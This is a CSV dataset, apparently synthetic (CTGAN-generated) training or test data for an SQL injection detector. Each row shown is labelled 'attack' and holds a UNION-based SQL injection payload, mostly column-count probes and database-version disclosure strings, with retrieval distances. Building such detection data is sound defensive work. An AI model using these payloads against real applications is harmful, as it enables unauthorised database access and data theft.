id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000019,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,5.657367263650651
CTGAN_000020,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000290,7.0184872802384985
CTGAN_000021,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000099,7.970714578638286
CTGAN_000022,attack,union,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",nearest_attack_euclidean,R000151,4.1458685902868835
CTGAN_000023,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.883197529609111
CTGAN_000024,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,10.064742209073252
CTGAN_000025,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000120,5.091973714474922
CTGAN_000026,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.683941026456681
CTGAN_000027,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,5.860425199434157
CTGAN_000028,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,9.326357032664973
CTGAN_000029,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000184,8.166604454242087
CTGAN_000030,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,5.729012521399315
CTGAN_000031,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000204,7.761425155825391
CTGAN_000032,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,5.636407780868702
CTGAN_000033,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,5.4635226428979555
CTGAN_000034,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000088,6.8427489028140585
CTGAN_000035,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,4.117190763350052
CTGAN_000036,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,4.577641220830421
CTGAN_000037,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,4.820218800617729
CTGAN_000038,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,4.566746147070092
CTGAN_000039,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,7.6914518632571465
CTGAN_000040,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000090,5.336498356723853
CTGAN_000041,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,3.7301339669057034
CTGAN_000042,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,7.998069523823988
CTGAN_000043,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000214,6.043684915394558
CTGAN_000044,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,5.367464014204761
CTGAN_000045,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,4.606045765845951
CTGAN_000046,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,6.834924868408372
CTGAN_000047,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,5.016191209137706
CTGAN_000048,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,4.6753863065370584
CTGAN_000049,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,4.3055093365580115
CTGAN_000050,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,5.841568200714484
CTGAN_000051,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,6.158637532618957
CTGAN_000052,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000117,6.031778625682215
CTGAN_000053,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,5.839280508983912
CTGAN_000054,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,4.44315631686028
CTGAN_000055,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000262,4.751225816072594
CTGAN_000056,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000189,8.018891676036697
CTGAN_000057,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,8.29642255857385
CTGAN_000058,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R000206,7.381150040551867
CTGAN_000059,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,5.103661105043405
CTGAN_000060,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,8.359364191266629
CTGAN_000061,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,7.066931404484978
CTGAN_000062,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,5.224191756850475
CTGAN_000063,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,8.040653312420122
CTGAN_000064,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,6.817584786250585
CTGAN_000065,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000105,6.455755779641078
CTGAN_000066,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.665750783280505
CTGAN_000067,attack,union,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",nearest_attack_euclidean,R000149,5.466556748231384
CTGAN_000068,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,9.493122598402136
CTGAN_000069,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000248,5.501203000112094
CTGAN_000070,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,7.826893371337063
CTGAN_000071,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,7.89816012618024
CTGAN_000072,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.514579888565602
CTGAN_000073,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,3.089728430729591
CTGAN_000074,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,6.579248774301878
CTGAN_000075,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,6.826962240204142
CTGAN_000076,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,5.759875485122975
CTGAN_000077,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,7.651890604503092
CTGAN_000078,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,7.290781108451371
CTGAN_000079,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000170,6.424752315513092
CTGAN_000080,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,6.068069581642243
CTGAN_000081,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000273,5.489584466944902
CTGAN_000082,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,5.828679261791083
CTGAN_000083,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000152,5.283356144688514
CTGAN_000084,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,5.738421903891239
CTGAN_000085,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000288,6.3267829785234335
CTGAN_000086,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,8.559150814304665
CTGAN_000087,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000262,5.266064901026976
CTGAN_000088,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000264,6.380144175441273
CTGAN_000089,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,4.948886629214205
CTGAN_000090,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,4.548362292809722
CTGAN_000091,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,5.711519044525709
CTGAN_000092,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,5.850658828436262
CTGAN_000093,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,6.554244893372359
CTGAN_000094,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,7.297397702202399
CTGAN_000095,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,8.449504915806227
CTGAN_000096,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,4.928741294805351
CTGAN_000097,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000227,5.1919427581050135
CTGAN_000098,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000055,5.064089271434677
CTGAN_000099,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,5.7657715249336325
CTGAN_000100,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,5.67949424229942
CTGAN_000101,attack,union,"1%"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000289,5.687542949837022
CTGAN_000102,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,6.085835739119183
CTGAN_000103,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,4.132406151565435
CTGAN_000104,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,7.907134546117791
CTGAN_000105,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000266,4.968453586096761
CTGAN_000106,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000021,9.093998497406346
CTGAN_000107,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,6.595679260203156
CTGAN_000108,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,4.891648290080462
CTGAN_000109,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,6.582117061986093
CTGAN_000110,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000197,5.895484862232066
CTGAN_000111,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,10.180129679537957
CTGAN_000112,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000273,4.279531384614141
CTGAN_000113,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,11.28549233411631
CTGAN_000114,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,5.934785049570448
CTGAN_000115,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,4.531778359131326
CTGAN_000116,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000089,6.44583285515081
CTGAN_000117,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,6.694753235250553
CTGAN_000118,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,5.95671923395177
CTGAN_000119,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,7.212557549873497
CTGAN_000120,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,4.942376974027395
CTGAN_000121,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,5.296716612553069
CTGAN_000122,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,4.585378171201278
CTGAN_000123,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,7.5543324727249495
CTGAN_000124,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,7.425183163143608
CTGAN_000125,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,6.983291099124503
CTGAN_000126,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,8.004576437824735
CTGAN_000127,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000039,8.572220629603887
CTGAN_000128,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,5.356903080425874
CTGAN_000129,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,4.3328900814908495
CTGAN_000130,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,5.888802117982513
CTGAN_000131,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000103,4.978714283099215
CTGAN_000132,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,6.793219997467999
CTGAN_000133,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000157,5.123158684766048
CTGAN_000134,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,8.067476654319451
CTGAN_000135,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000264,6.119124055712489
CTGAN_000136,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,7.1773817691842945
CTGAN_000137,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,6.865826444075454
CTGAN_000138,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,7.50240500553827
CTGAN_000139,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,8.18235894405908
CTGAN_000140,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,4.439749164297199
CTGAN_000141,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,3.8419709784149823
CTGAN_000142,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,5.88763927379086
CTGAN_000143,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,5.478339738566832
CTGAN_000144,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,8.319630403249873
CTGAN_000145,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,9.046442047778172
CTGAN_000146,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000268,5.069232509484403
CTGAN_000147,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000157,6.903479161876591
CTGAN_000148,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,5.999853434367459
CTGAN_000149,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000127,5.502393397881599
CTGAN_000150,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000111,5.475910385633682
CTGAN_000151,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000034,8.805314397204702
CTGAN_000152,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,5.129163234310127
CTGAN_000153,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000072,5.086683475040014
CTGAN_000154,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,5.307231925617056
CTGAN_000155,attack,union,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",nearest_attack_euclidean,R000253,5.401765813925361
CTGAN_000156,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000213,6.188474737075602
CTGAN_000157,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,7.114889872312706
CTGAN_000158,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000241,3.701549723357381
CTGAN_000159,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000143,5.899515317662012
CTGAN_000160,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,6.819936477114371
CTGAN_000161,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,5.19557062933471
CTGAN_000162,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000228,6.643297558509426
CTGAN_000163,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,3.5268475762904923
CTGAN_000164,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,10.52031525211407
CTGAN_000165,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000248,6.569302083088685
CTGAN_000166,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000264,5.1483156241056465
CTGAN_000167,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000023,6.807206408930496
CTGAN_000168,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000200,5.508993523742459
CTGAN_000169,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000204,4.654694411727783
CTGAN_000170,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000082,5.16131333145968
CTGAN_000171,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000119,4.941194412044621
CTGAN_000172,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000303,6.0210999572375545
CTGAN_000173,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,4.723633924225899
CTGAN_000174,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000208,6.252502951462737
CTGAN_000175,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,5.630499985404327
CTGAN_000176,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,5.570223059011616
CTGAN_000177,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000231,5.2714114690190925
CTGAN_000178,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,4.847554903595224
CTGAN_000179,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,4.658590294981291
CTGAN_000180,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,3.14415880120811
CTGAN_000181,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,4.65121813324273
CTGAN_000182,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,6.704256108815489
CTGAN_000183,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,8.20075540837216
CTGAN_000184,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,4.51539776607123
CTGAN_000185,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000170,6.174277915436524
CTGAN_000186,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000143,7.0315678860238355
CTGAN_000187,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000279,6.022977462228625
CTGAN_000188,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000156,5.790084539896863
CTGAN_000189,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,5.482749742974598
CTGAN_000190,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000110,5.712403677930276
CTGAN_000191,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000085,5.114967443651388
CTGAN_000192,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000018,10.132025339436888
CTGAN_000193,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000214,6.190661513554715
CTGAN_000194,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000156,5.856491677970306
CTGAN_000195,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000099,5.598003124074254
CTGAN_000196,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000086,8.137566824246235
CTGAN_000197,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000194,4.8977484576217245
CTGAN_000198,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000187,4.621815982792524
CTGAN_000199,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000251,7.84674651419804
CTGAN_000200,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,7.497862460776691
